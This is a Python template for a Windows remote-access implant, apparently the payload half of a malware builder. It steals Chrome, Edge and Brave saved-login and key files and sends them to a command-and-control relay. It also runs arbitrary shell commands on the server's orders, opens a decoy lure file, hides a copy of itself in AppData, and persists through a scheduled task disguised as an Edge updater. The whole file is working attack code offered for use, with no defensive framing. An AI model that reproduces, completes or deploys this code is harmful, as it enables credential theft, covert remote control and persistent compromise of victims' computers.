# payload/template.py (Full Code - Revamped for Stability)
import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, zipfile
from datetime import datetime

# Graceful Import Handling
try: from mss import mss
except ImportError: mss = None
try: import winreg
except ImportError: winreg = None
try: import psutil
except ImportError: psutil = None
try: import ctypes
except ImportError: ctypes = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
results_to_send, results_lock = [], threading.Lock()
TERMINATE_FLAG = threading.Event()

# --- Utility Functions ---
def send_result(command_name, output_data, status="success"):
    with results_lock:
        results_to_send.append({"command": command_name, "output": {"status": status, "data": output_data}})

def _run_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip()
    except: return ""

def _get_appdata_paths():
    base = os.path.expanduser("~")
    return {"local": os.path.join(base, "AppData", "Local"), "roaming": os.path.join(base, "AppData", "Roaming")}

# --- Core C2 Actions ---
def _action_popup(params):
    if ctypes and hasattr(ctypes.windll, 'user32'):
        ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello!'), params.get('title', 'Message'), 0)
    return {"status": "success", "data": "Popup displayed."}

def _action_shell(params):
    command = params.get("command", "")
    return {"status": "success", "data": _run_command(command)}

def _action_pslist(params):
    if not psutil: return {"status": "error", "data": "Psutil library not available."}
    procs = [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
    return {"status": "success", "data": sorted(procs, key=lambda p: p['name'])}

# --- Data Harvesting ---
def harvest_browser_files(appdata_paths):
    browser_paths = {
        'Chrome': os.path.join(appdata_paths["local"], 'Google\\Chrome\\User Data'),
        'Edge': os.path.join(appdata_paths["local"], 'Microsoft\\Edge\\User Data'),
        'Brave': os.path.join(appdata_paths["local"], 'BraveSoftware\\Brave-Browser\\User Data')
    }
    files_to_exfiltrate = {}
    for browser, path in browser_paths.items():
        if not os.path.exists(path): continue
        for root, _, files in os.walk(path):
            if "Login Data" in files: files_to_exfiltrate[f"{browser}_Login_Data"] = os.path.join(root, "Login Data")
            if "Local State" in files: files_to_exfiltrate[f"{browser}_Local_State"] = os.path.join(root, "Local State")
    if not files_to_exfiltrate: return {"status": "success", "data": "No supported browser data found."}
    try:
        zip_path = os.path.join(os.environ["TEMP"], f"bdata_{SESSION_ID}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for name, path in files_to_exfiltrate.items():
                if os.path.exists(path): zf.write(path, arcname=name)
        with open(zip_path, "rb") as f: b64_zip = base64.b64encode(f.read()).decode()
        os.remove(zip_path)
        return {"status": "success", "data": b64_zip}
    except Exception as e: return {"status": "error", "data": f"Failed to package browser files: {e}"}

def perform_initial_harvest():
    try:
        appdata = _get_appdata_paths()
        uname = platform.uname()
        send_result("System Info", {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "arch": uname.machine})
        time.sleep(0.1)
        browser_data = harvest_browser_files(appdata)
        send_result("Browser Files", browser_data)
        time.sleep(0.1)
        # Add any other lightweight startup info here
        send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] Initial harvest complete.")
    except Exception as e:
        send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] CRITICAL ERROR during harvest: {e}")

# --- FIX: New action handler for server-commanded harvest ---
def _action_full_harvest(params):
    # Run the harvest in a new thread to avoid blocking the C2 loop
    harvest_thread = threading.Thread(target=perform_initial_harvest, daemon=True)
    harvest_thread.start()
    return {"status": "success", "data": "Full harvest initiated."}

def execute_command(command_data):
    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    result = {"status": "error", "data": f"Unsupported action: {action}"}
    if callable(handler_func):
        try: result = handler_func(params)
        except Exception as e: result = {"status": "error", "data": f"Handler failed: {e}"}
    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
        except requests.exceptions.RequestException: pass

# --- Main C2 Loop (Now more stable) ---
def command_and_control_loop():
    initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.system()}
    while not TERMINATE_FLAG.is_set():
        try:
            with results_lock:
                outgoing_results = results_to_send[:]; results_to_send.clear()
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, **initial_metadata}
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=False)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.exceptions.RequestException:
            pass 
        time.sleep(random.randint(10, 18))

def initial_lure():
    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
    if DECOY_ENABLED:
        try:
            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
            subprocess.Popen(f'start "" "{decoy_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

def install_persistence(stealth_path):
    if not (PERSISTENCE_ENABLED and platform.system() == "Windows"): return
    task_name = f"Microsoft Edge Update Task Core"
    command = f'schtasks /create /tn "{task_name}" /tr "\'{stealth_path}\'" /sc onlogon /rl highest /f'
    _run_command(command)

if __name__ == "__main__":
    stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA'), 'Microsoft', 'SysData')
    my_name = os.path.basename(sys.executable)
    stealth_path = os.path.join(stealth_dir, my_name)

    # This logic ensures the payload only tries to install itself once.
    if hasattr(sys, 'frozen') and os.path.abspath(sys.executable).lower() != stealth_path.lower():
        try:
            initial_lure()
            os.makedirs(stealth_dir, exist_ok=True)
            shutil.copy2(sys.executable, stealth_path)
            install_persistence(stealth_path)
            subprocess.Popen([stealth_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass # If setup fails, we'll just run from here temporarily.
        finally:
            sys.exit(0) # The original process always exits.

    # --- Main execution for the persistent process ---
    c2_thread = threading.Thread(target=command_and_control_loop, daemon=False)
    c2_thread.start()
    
    # Keep the main thread alive, allowing daemon threads to run
    while not TERMINATE_FLAG.is_set():
        time.sleep(60)